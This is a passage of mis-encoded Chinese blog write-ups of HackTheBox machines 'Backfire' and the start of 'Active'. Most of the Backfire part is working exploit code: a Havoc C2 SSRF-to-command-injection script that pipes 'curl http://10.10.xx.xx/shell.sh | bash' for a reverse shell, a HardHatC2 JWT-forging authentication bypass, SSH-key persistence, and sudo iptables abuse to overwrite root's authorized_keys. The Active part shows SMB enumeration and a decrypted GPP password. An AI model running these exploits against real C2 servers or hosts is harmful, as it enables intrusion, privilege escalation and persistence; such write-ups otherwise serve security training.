æ­¤å¯ä»¥è€ƒè™‘çš„æ˜¯ï¼Œå°†ä¸¤ä¸ªè„šæœ¬ç»“åˆèµ·æ¥ï¼Œåœ¨æ³¨å†Œå®Œregisteråä½¿ç”¨websocketå‘½ä»¤æ³¨å…¥ï¼Œç”±äºä¸¤ä¸ªè„šæœ¬çš„é€šä¿¡åè®®æ˜¯ä¸åŒçš„ï¼Œå› æ­¤éœ€è¦å°†HTTPåè®®æ³¨å†Œåå‡çº§ä¸ºWebsocketåè®®\nå‡çº§åè®®çš„æŠ¥å¤´ç±»ä¼¼äºè¿™æ ·\nGET /chat HTTP/1.1\rHost: server.example.com\rUpgrade: websocket\rConnection: Upgrade\rSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\rSec-WebSocket-Protocol: chat, superchat\rSec-WebSocket-Version: 13 å°†å‡çº§åè®®çš„æ•°æ®é€šè¿‡å¥—æ¥å­—å‘é€åˆ°æœåŠ¡å™¨\nç”±äºä½¿ç”¨çš„æ˜¯Websocketé€šä¿¡ï¼Œé‚£ä¹ˆå¯¹åº”çš„æ•°æ®ä¹Ÿè¦è½¬æ¢ä¸ºWebsocketçš„æ ¼å¼ï¼Œè¿™åœ¨pythonè‡ªå¸¦çš„åº“ä¸­æ˜¯å°è£…å¥½çš„ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯ä»HTTPè½¬æ¢çš„ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨è½¬æ¢æ•°æ®ä¸ºWebsocketæ•°æ®å¸§\næœ€ç»ˆçš„ä»£ç å¦‚ä¸‹\nimport binascii\rimport json\rimport random\rimport requests\rimport argparse\rimport urllib3\rimport os\rimport hashlib\rurllib3.disable_warnings()\rfrom Crypto.Cipher import AES\rfrom Crypto.Util import Counter\rkey_bytes = 32\rdef decrypt(key, iv, ciphertext):\rif len(key) \u0026lt;= key_bytes:\rfor _ in range(len(key), key_bytes):\rkey += b\u0026#34;0\u0026#34;\rassert len(key) == key_bytes\riv_int = int(binascii.hexlify(iv), 16)\rctr = Counter.new(AES.block_size * 8, initial_value=iv_int)\raes = AES.new(key, AES.MODE_CTR, counter=ctr)\rplaintext = aes.decrypt(ciphertext)\rreturn plaintext\rdef int_to_bytes(value, length=4, byteorder=\u0026#34;big\u0026#34;):\rreturn value.to_bytes(length, byteorder)\rdef encrypt(key, iv, plaintext):\rif len(key) \u0026lt;= key_bytes:\rfor x in range(len(key),key_bytes):\rkey = key + b\u0026#34;0\u0026#34;\rassert len(key) == key_bytes\riv_int = int(binascii.hexlify(iv), 16)\rctr = Counter.new(AES.block_size * 8, initial_value=iv_int)\raes = AES.new(key, AES.MODE_CTR, counter=ctr)\rciphertext = aes.encrypt(plaintext)\rreturn ciphertext\rdef register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):\r# DEMON_INITIALIZE / 99\rcommand = b\u0026#34;\\x00\\x00\\x00\\x63\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x01\u0026#34;\rdemon_id = agent_id\rhostname_length = int_to_bytes(len(hostname))\rusername_length = int_to_bytes(len(username))\rdomain_name_length = int_to_bytes(len(domain_name))\rinternal_ip_length = int_to_bytes(len(internal_ip))\rprocess_name_length = int_to_bytes(len(process_name) - 6)\rdata = b\u0026#34;\\xab\u0026#34; * 100\rheader_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rprint(\u0026#34;[***] Trying to register agent...\u0026#34;)\rr = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Success!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to register agent - {r.status_code} {r.text}\u0026#34;)\rdef open_socket(socket_id, target_address, target_port):\r# COMMAND_SOCKET / 2540\rcommand = b\u0026#34;\\x00\\x00\\x09\\xec\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x02\u0026#34;\r# SOCKET_COMMAND_OPEN / 16\rsubcommand = b\u0026#34;\\x00\\x00\\x00\\x10\u0026#34;\rsub_request_id = b\u0026#34;\\x00\\x00\\x00\\x03\u0026#34;\rlocal_addr = b\u0026#34;\\x22\\x22\\x22\\x22\u0026#34;\rlocal_port = b\u0026#34;\\x33\\x33\\x33\\x33\u0026#34;\rforward_addr = b\u0026#34;\u0026#34;\rfor octet in target_address.split(\u0026#34;.\u0026#34;)[::-1]:\rforward_addr += int_to_bytes(int(octet), length=1)\rforward_port = int_to_bytes(target_port)\rpackage = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port\rpackage_size = int_to_bytes(len(package) + 4)\rheader_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rdata = agent_header + header_data\rprint(\u0026#34;[***] Trying to open socket on the teamserver...\u0026#34;)\rr = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Success!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}\u0026#34;)\rdef write_socket(socket_id, data):\r# COMMAND_SOCKET / 2540\rcommand = b\u0026#34;\\x00\\x00\\x09\\xec\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x08\u0026#34;\r# SOCKET_COMMAND_READ / 11\rsubcommand = b\u0026#34;\\x00\\x00\\x00\\x11\u0026#34;\rsub_request_id = b\u0026#34;\\x00\\x00\\x00\\xa1\u0026#34;\r# SOCKET_TYPE_CLIENT / 3\rsocket_type = b\u0026#34;\\x00\\x00\\x00\\x03\u0026#34;\rsuccess = b\u0026#34;\\x00\\x00\\x00\\x01\u0026#34;\rdata_length = int_to_bytes(len(data))\rpackage = subcommand+socket_id+socket_type+success+data_length+data\rpackage_size = int_to_bytes(len(package) + 4)\rheader_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rpost_data = agent_header + header_data\rprint(\u0026#34;[***] Trying to write to the socket\u0026#34;)\rr = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Success!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to write data to the socket - {r.status_code} {r.text}\u0026#34;)\rdef read_socket(socket_id):\r# COMMAND_GET_JOB / 1\rcommand = b\u0026#34;\\x00\\x00\\x00\\x01\u0026#34;\rrequest_id = b\u0026#34;\\x00\\x00\\x00\\x09\u0026#34;\rheader_data = command + request_id\rsize = 12 + len(header_data)\rsize_bytes = size.to_bytes(4, \u0026#39;big\u0026#39;)\ragent_header = size_bytes + magic + agent_id\rdata = agent_header + header_data\rprint(\u0026#34;[***] Trying to poll teamserver for socket output...\u0026#34;)\rr = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)\rif r.status_code == 200:\rprint(\u0026#34;[***] Read socket output successfully!\u0026#34;)\relse:\rprint(f\u0026#34;[!!!] Failed to read socket output - {r.status_code} {r.text}\u0026#34;)\rreturn \u0026#34;\u0026#34;\rcommand_id = int.from_bytes(r.content[0:4], \u0026#34;little\u0026#34;)\rrequest_id = int.from_bytes(r.content[4:8], \u0026#34;little\u0026#34;)\rpackage_size = int.from_bytes(r.content[8:12], \u0026#34;little\u0026#34;)\renc_package = r.content[12:]\rreturn decrypt(AES_Key, AES_IV, enc_package)[12:]\rdef create_websocket_request(host, port):\rrequest = (\rf\u0026#34;GET /havoc/ HTTP/1.1\\r\\n\u0026#34;\rf\u0026#34;Host: {host}:{port}\\r\\n\u0026#34;\rf\u0026#34;Upgrade: websocket\\r\\n\u0026#34;\rf\u0026#34;Connection: Upgrade\\r\\n\u0026#34;\rf\u0026#34;Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\\r\\n\u0026#34;\rf\u0026#34;Sec-WebSocket-Version: 13\\r\\n\u0026#34;\rf\u0026#34;\\r\\n\u0026#34;\r).encode()\rreturn request\rdef build_websocket_frame(payload):\rpayload_bytes = payload.encode(\u0026#34;utf-8\u0026#34;)\rframe = bytearray()\rframe.append(0x81)\rpayload_length = len(payload_bytes)\rif payload_length \u0026lt;= 125:\rframe.append(0x80 | payload_length)\relif payload_length \u0026lt;= 65535:\rframe.append(0x80 | 126)\rframe.extend(payload_length.to_bytes(2, byteorder=\u0026#34;big\u0026#34;))\relse:\rframe.append(0x80 | 127)\rframe.extend(payload_length.to_bytes(8, byteorder=\u0026#34;big\u0026#34;))\rmasking_key = os.urandom(4)\rframe.extend(masking_key)\rmasked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))\rframe.extend(masked_payload)\rreturn frame\rparser = argparse.ArgumentParser()\rparser.add_argument(\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;, help=\u0026#34;The listener target in URL format\u0026#34;, required=True)\rparser.add_argument(\u0026#34;-i\u0026#34;, \u0026#34;--ip\u0026#34;, help=\u0026#34;The IP to open the socket with\u0026#34;, required=True)\rparser.add_argument(\u0026#34;-p\u0026#34;, \u0026#34;--port\u0026#34;, help=\u0026#34;The port to open the socket with\u0026#34;, required=True)\rparser.add_argument(\u0026#34;-A\u0026#34;, \u0026#34;--user-agent\u0026#34;, help=\u0026#34;The User-Agent for the spoofed agent\u0026#34;, default=\u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\u0026#34;)\rparser.add_argument(\u0026#34;-H\u0026#34;, \u0026#34;--hostname\u0026#34;, help=\u0026#34;The hostname for the spoofed agent\u0026#34;, default=\u0026#34;DESKTOP-7F61JT1\u0026#34;)\rparser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--username\u0026#34;, help=\u0026#34;The username for the spoofed agent\u0026#34;, default=\u0026#34;Administrator\u0026#34;)\rparser.add_argument(\u0026#34;-d\u0026#34;, \u0026#34;--domain-name\u0026#34;, help=\u0026#34;The domain name for the spoofed agent\u0026#34;, default=\u0026#34;ECORP\u0026#34;)\rparser.add_argument(\u0026#34;-n\u0026#34;, \u0026#34;--process-name\u0026#34;, help=\u0026#34;The process name for the spoofed agent\u0026#34;, default=\u0026#34;msedge.exe\u0026#34;)\rparser.add_argument(\u0026#34;-ip\u0026#34;, \u0026#34;--internal-ip\u0026#34;, help=\u0026#34;The internal ip for the spoofed agent\u0026#34;, default=\u0026#34;10.1.33.7\u0026#34;)\rargs = parser.parse_args()\r# 0xDEADBEEF\rmagic = b\u0026#34;\\xde\\xad\\xbe\\xef\u0026#34;\rteamserver_listener_url = args.target\rheaders = {\r\u0026#34;User-Agent\u0026#34;: args.user_agent\r}\ragent_id = int_to_bytes(random.randint(100000, 1000000))\rAES_Key = b\u0026#34;\\x00\u0026#34; * 32\rAES_IV = b\u0026#34;\\x00\u0026#34; * 16\rhostname = bytes(args.hostname, encoding=\u0026#34;utf-8\u0026#34;)\rusername = bytes(args.username, encoding=\u0026#34;utf-8\u0026#34;)\rdomain_name = bytes(args.domain_name, encoding=\u0026#34;utf-8\u0026#34;)\rinternal_ip = bytes(args.internal_ip, encoding=\u0026#34;utf-8\u0026#34;)\rprocess_name = args.process_name.encode(\u0026#34;utf-16le\u0026#34;)\rprocess_id = int_to_bytes(random.randint(1000, 5000))\rregister_agent(hostname, username, domain_name, internal_ip, process_name, process_id)\rsocket_id = b\u0026#34;\\x11\\x11\\x11\\x11\u0026#34;\ropen_socket(socket_id, args.ip, int(args.port))\rHOSTNAME = \u0026#34;127.0.0.1\u0026#34;\rPORT = 40056\rUSER = \u0026#34;ilya\u0026#34;\rPASSWORD = \u0026#34;CobaltStr1keSuckz!\u0026#34;\r#upgrade http to websocet so that we can use the second script\rwrite_socket(socket_id,create_websocket_request(host=HOSTNAME, port=PORT))\r# Authenticate to teamserver\rpayload = {\u0026#34;Body\u0026#34;: {\u0026#34;Info\u0026#34;: {\u0026#34;Password\u0026#34;: hashlib.sha3_256(PASSWORD.encode()).hexdigest(), \u0026#34;User\u0026#34;: USER}, \u0026#34;SubEvent\u0026#34;: 3}, \u0026#34;Head\u0026#34;: {\u0026#34;Event\u0026#34;: 1, \u0026#34;OneTime\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Time\u0026#34;: \u0026#34;18:40:17\u0026#34;, \u0026#34;User\u0026#34;: USER}}\rpayload_json=json.dumps(payload)\rwrite_socket(socket_id, build_websocket_frame(payload_json))\r# Create a listener to build demon agent for\rpayload = {\u0026#34;Body\u0026#34;:{\u0026#34;Info\u0026#34;:{\u0026#34;Headers\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;HostBind\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;HostHeader\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;HostRotation\u0026#34;:\u0026#34;round-robin\u0026#34;,\u0026#34;Hosts\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;Name\u0026#34;:\u0026#34;abc\u0026#34;,\u0026#34;PortBind\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;PortConn\u0026#34;:\u0026#34;443\u0026#34;,\u0026#34;Protocol\u0026#34;:\u0026#34;Https\u0026#34;,\u0026#34;Proxy Enabled\u0026#34;:\u0026#34;false\u0026#34;,\u0026#34;Secure\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;Status\u0026#34;:\u0026#34;online\u0026#34;,\u0026#34;Uris\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;UserAgent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\u0026#34;},\u0026#34;SubEvent\u0026#34;:1},\u0026#34;Head\u0026#34;:{\u0026#34;Event\u0026#34;:2,\u0026#34;OneTime\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Time\u0026#34;:\u0026#34;08:39:18\u0026#34;,\u0026#34;User\u0026#34;: USER}}\rpayload_json=json.dumps(payload)\rwrite_socket(socket_id, build_websocket_frame(payload_json))\r# Create a psuedo shell with RCE loop Change Here\rcmd = \u0026#39;curl http://10.10.xx.xx/shell.sh | bash\u0026#39;\rinjection = \u0026#34;\u0026#34;\u0026#34; \\\\\\\\\\\\\\\u0026#34; -mbla; \u0026#34;\u0026#34;\u0026#34; + cmd + \u0026#34;\u0026#34;\u0026#34; 1\u0026gt;\u0026amp;2 \u0026amp;\u0026amp; false #\u0026#34;\u0026#34;\u0026#34;\r# Command injection in demon compilation command\rpayload = {\u0026#34;Body\u0026#34;: {\u0026#34;Info\u0026#34;: {\u0026#34;AgentType\u0026#34;: \u0026#34;Demon\u0026#34;, \u0026#34;Arch\u0026#34;: \u0026#34;x64\u0026#34;, \u0026#34;Config\u0026#34;: \u0026#34;{\\n \\\u0026#34;Amsi/Etw Patch\\\u0026#34;: \\\u0026#34;None\\\u0026#34;,\\n \\\u0026#34;Indirect Syscall\\\u0026#34;: false,\\n \\\u0026#34;Injection\\\u0026#34;: {\\n \\\u0026#34;Alloc\\\u0026#34;: \\\u0026#34;Native/Syscall\\\u0026#34;,\\n \\\u0026#34;Execute\\\u0026#34;: \\\u0026#34;Native/Syscall\\\u0026#34;,\\n \\\u0026#34;Spawn32\\\u0026#34;: \\\u0026#34;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\notepad.exe\\\u0026#34;,\\n \\\u0026#34;Spawn64\\\u0026#34;: \\\u0026#34;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe\\\u0026#34;\\n },\\n \\\u0026#34;Jitter\\\u0026#34;: \\\u0026#34;0\\\u0026#34;,\\n \\\u0026#34;Proxy Loading\\\u0026#34;: \\\u0026#34;None (LdrLoadDll)\\\u0026#34;,\\n \\\u0026#34;Service Name\\\u0026#34;:\\\u0026#34;\u0026#34; + injection + \u0026#34;\\\u0026#34;,\\n \\\u0026#34;Sleep\\\u0026#34;: \\\u0026#34;2\\\u0026#34;,\\n \\\u0026#34;Sleep Jmp Gadget\\\u0026#34;: \\\u0026#34;None\\\u0026#34;,\\n \\\u0026#34;Sleep Technique\\\u0026#34;: \\\u0026#34;WaitForSingleObjectEx\\\u0026#34;,\\n \\\u0026#34;Stack Duplication\\\u0026#34;: false\\n}\\n\u0026#34;, \u0026#34;Format\u0026#34;: \u0026#34;Windows Service Exe\u0026#34;, \u0026#34;Listener\u0026#34;: \u0026#34;abc\u0026#34;}, \u0026#34;SubEvent\u0026#34;: 2}, \u0026#34;Head\u0026#34;: {\r\u0026#34;Event\u0026#34;: 5, \u0026#34;OneTime\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;Time\u0026#34;: \u0026#34;18:39:04\u0026#34;, \u0026#34;User\u0026#34;: USER}}\rpayload_json=json.dumps(payload)\rwrite_socket(socket_id, build_websocket_frame(payload_json)) ç„¶åè®¾ç½®ç›‘å¬ï¼Œè·å–åˆ°äº†åå¼¹Shellï¼Œå¹¶ä¸”æ‹¿åˆ°user.txt\nRoot #\rç”±äºè¿™ä¸ªåå¼¹Shellä¼šåœ¨ä¸€æ®µæ—¶é—´åæ–­æ‰ï¼Œå› æ­¤éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼è¿›è¡ŒæŒä¹…åŒ–è¿æ¥\næŠŠæœ¬åœ°çš„sshå…¬é’¥è¿½åŠ åˆ°ilyaçš„å¯†é’¥æ–‡ä»¶ä¸­\n#in reverse shell echo \u0026#34;your key\u0026#34; \u0026gt;\u0026gt; ~/.ssh/authorized_keys ilya@backfire:~$ cat hardhat.txt Sergej said he installed HardHatC2 for testing and not made any changes to the defaults\rI hope he prefers Havoc bcoz I don\u0026#39;t wanna learn another C2 framework, also Go \u0026gt; C# æŸ¥çœ‹å†…ç½‘ç«¯å£æƒ…å†µ\næœç´¢è¿™ä¸ªHardHatC2çš„ç›¸å…³æ¼æ´ï¼Œæˆ‘æ‰¾åˆ°äº†è¿™ä¸ªğŸ‘‡\nHardHatC2 0-Days (RCE \u0026amp; AuthN Bypass) | by Pichaya Morimoto | Jan, 2025 | à¸ªà¸¢à¸²à¸¡à¸–à¸™à¸±à¸”à¹à¸®à¸ é¦–å…ˆéœ€è¦å°†å†…ç½‘çš„7096ç«¯å£å’Œ5000ç«¯å£é€šè¿‡SSHä»£ç†å‡ºæ¥\n[root@kali] /home/kali/Backfire â¯ ssh -i ~/.ssh/id_rsa ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000 ç„¶åè¿è¡Œ\n# @author Siam Thanat Hack Co., Ltd. (STH)\rimport jwt\rimport datetime\rimport uuid\rimport requests\rrhost = \u0026#39;127.0.0.1:5000\u0026#39;\r# Craft Admin JWT\rsecret = \u0026#34;jtee43gt-6543-2iur-9422-83r5w27hgzaq\u0026#34;\rissuer = \u0026#34;hardhatc2.com\u0026#34;\rnow = datetime.datetime.utcnow()\rexpiration = now + datetime.timedelta(days=28)\rpayload = {\r\u0026#34;sub\u0026#34;: \u0026#34;HardHat_Admin\u0026#34;, \u0026#34;jti\u0026#34;: str(uuid.uuid4()),\r\u0026#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\u0026#34;: \u0026#34;1\u0026#34;,\r\u0026#34;iss\u0026#34;: issuer,\r\u0026#34;aud\u0026#34;: issuer,\r\u0026#34;iat\u0026#34;: int(now.timestamp()),\r\u0026#34;exp\u0026#34;: int(expiration.timestamp()),\r\u0026#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/role\u0026#34;: \u0026#34;Administrator\u0026#34;\r}\rtoken = jwt.encode(payload, secret, algorithm=\u0026#34;HS256\u0026#34;)\rprint(\u0026#34;Generated JWT:\u0026#34;)\rprint(token)\r# Use Admin JWT to create a new user \u0026#39;sth_pentest\u0026#39; as TeamLead\rburp0_url = f\u0026#34;https://{rhost}/Login/Register\u0026#34;\rburp0_headers = {\r\u0026#34;Authorization\u0026#34;: f\u0026#34;Bearer {token}\u0026#34;,\r\u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;\r}\rburp0_json = {\r\u0026#34;password\u0026#34;: \u0026#34;sth_pentest\u0026#34;,\r\u0026#34;role\u0026#34;: \u0026#34;TeamLead\u0026#34;,\r\u0026#34;username\u0026#34;: \u0026#34;sth_pentest\u0026#34;\r}\rr = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)\rprint(r.text) è¿è¡Œä¹‹åå¯ä»¥çœ‹åˆ°ç”¨æˆ·è¢«åˆ›å»ºæˆåŠŸäº†ï¼Œéšåè®¿é—®https://127.0.0.1:7096/ï¼Œä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•\næ¥åˆ°æ¨¡æ‹Ÿç»ˆç«¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nç”¨ç›¸åŒçš„æ–¹å¼æŠŠè‡ªå·±çš„sshå¯†é’¥è¿½åŠ åˆ°sergejçš„å¯†é’¥ä¸­\nç„¶åä½¿ç”¨sshç™»å½•sergejï¼ŒæŸ¥çœ‹sudoæƒé™å‘½ä»¤\næœç´¢iptablesç›¸å…³çš„ææƒæ“ä½œ\nShielder - A Journey From sudo iptables To Local Privilege Escalation\nåˆ©ç”¨iptablesææƒ | CN-SEC ä¸­æ–‡ç½‘\nå…¶ä¸­çš„æ³¨é‡ŠåŠŸèƒ½ç”¨æ¥è¦†ç›–å…¶ä»–æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘è¦†ç›–æ‰ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œå°¤å…¶æ˜¯å¯ä»¥ä¼ªé€ rootèº«ä»½çš„\nsudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $\u0026#39;\\nYourKeysHere\\n\u0026#39; ç»è¿‡æµ‹è¯•è¿™ä¸ªcommentçš„é•¿åº¦ä¸èƒ½å¤ªé•¿ï¼Œå› æ­¤sshçš„å¯†é’¥é•¿åº¦è¦ç›¸å¯¹çŸ­ä¸€ç‚¹\n[root@kali] /home/kali/Backfire â¯ ssh-keygen -t ed25519 ç„¶åè¿›è¡Œè¦†ç›–rootçš„å¯†é’¥æ–‡ä»¶\nsergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $\u0026#39;\\n your_ed25519_pub_keys\\n\u0026#39;\rsergej@backfire:~$ sudo /usr/sbin/iptables -S\rsergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys Summary #\rUserï¼šé€šè¿‡Havocçš„SSRFè¿æ¥åˆ°å†…ç½‘ç«¯å£ï¼Œç”±äºè§¦å‘RCEçš„åè®®æ˜¯Websocketï¼Œæ‰€ä»¥éœ€è¦åœ¨ä¼ªé€ agentä¹‹åå°±è¦å°†åè®®è½¬æ¢ä¸ºWebsocketã€‚å°†ä¸¤ä¸ªè„šæœ¬è¿›è¡Œèåˆï¼Œæ‹¿åˆ°User.txtï¼Œå¹¶ä¸”å†™å…¥sshå¯†é’¥è¿›è¡ŒæŒä¹…åŒ–è¿æ¥ã€‚\nRootï¼šå†…ç½‘ç«¯å£ä»£ç†å‡ºæ¥åï¼Œå‘ç°å­˜åœ¨ç»•è¿‡èº«ä»½è®¤è¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ï¼ŒåŒæ ·å†™å…¥sshå¯†é’¥è¿›è¡Œè¿æ¥ï¼Œå‘ç°å­˜åœ¨iptablesç‰¹æ®Šæƒé™å‘½ä»¤ï¼Œå¯ä»¥å°†ä»»æ„æ–‡ä»¶è¿›è¡Œè¦†ç›–ï¼Œæœ€åé€šè¿‡å†™å…¥sshå¯†é’¥è¿›è¡Œè¿æ¥å¾—åˆ°root.txtã€‚\n","date":"2025-01-20","externalUrl":null,"permalink":"/posts/2025/01/htb-backfire/","section":"Posts","summary":"","title":"HTB-Backfire","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap #\r[root@kali] /home/kali/Active â¯ nmap active.htb -sV -Pn -T4 PORT STATE SERVICE VERSION\r53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r49152/tcp open msrpc Microsoft Windows RPC\r49153/tcp open msrpc Microsoft Windows RPC\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49158/tcp open msrpc Microsoft Windows RPC\r49165/tcp open msrpc Microsoft Windows RPC\r49167/tcp open msrpc Microsoft Windows RPC\rService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows SMB File Leak #\råŒ¿åç™»é™†SMBï¼Œå‘ç°å¯ä»¥è¯»å–çš„Replication\n[root@kali] /home/kali/Active â¯ smbclient -L //active.htb/ Password for [WORKGROUP\\root]:\rAnonymous login successful\rSharename Type Comment\r--------- ---- -------\rADMIN$ Disk Remote Admin\rC$ Disk Default share\rIPC$ IPC Remote IPC\rNETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk [root@kali] /home/kali/Active â¯ cat Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt;\r\u0026lt;/Groups\u0026gt; GPP-decrypt #\rç»è¿‡æœç´¢æŸ¥æ‰¾åˆ°äº†AESå¯†é’¥æ˜¯å…¬å¼€çš„ï¼š[MS-GPPREF]: Password Encryption | Microsoft Learn\nä½¿ç”¨ä¸‹é¢çš„è„šæœ¬è¿›è¡Œè§£å¯†å¾—åˆ°å¯†ç \n[github author=\u0026ldquo;t0thkr1s\u0026rdquo; project=\u0026ldquo;gpp-decrypt\u0026rdquo;][/github]\n[root@kali] /home/kali/Active/gpp-decrypt (master) â¯ python gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\r/home/kali/Active/gpp-decrypt/gpp-decrypt.py:10: SyntaxWarning: invalid escape sequence \u0026#39;\\ \u0026#39;\rbanner = \u0026#39;\u0026#39;\u0026#39;\r__ __ ___ _ ___ ___ ____ ___/ / ___ ____ ____ __ __ ___ / /_\r/ _ `/ / _ \\ / _ \\/___// _ / / -_)/ __/ / __/ / // / / _ \\/ __/\r\\_, / / .__/ / .__/ \\_,_/ \\__/ \\__/ /_/ \\_, / / .__/\\__/ /___/ /_/ /_/ /___/ /_/ [ * ] Password: GPPstillStandingStrong2k18 æŸ¥çœ‹è¿™ä¸ªç”¨æˆ·çš„SMBæƒé™ï¼Œå‘ç°å¯ä»¥è¯»å–Users\n[root@kali] /home/kali/Active â¯ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.XX.XX\rDisk Permissions Comment\r---- ----------- -------\rADMIN$ NO ACCESS Remote Admin\rC$ NO ACCESS Default share\rIPC$ NO ACCESS Remote IPC\rNETLOGON READ ONLY Logon server share Replication READ ONLY\rSYSVOL READ ONLY Logon server share Users READ ONLY æ‹¿åˆ°User.txt\n[root@kali] /home/kali/Active â¯ smbclient //active.htb/Users -U SVC_TGS Password for [WORKGROUP\\SVC_TGS]:\rTry \u0026#34;help\u0026#34; to get a list of possible commands.\rsmb: \\\u0026gt; ls\r. DR 0 Sat Jul 21 22:39:20 2018\r.. DR 0 Sat Jul 21 22:39:20 2018\rAdministrator D 0 Mon Jul 16 18:14:21 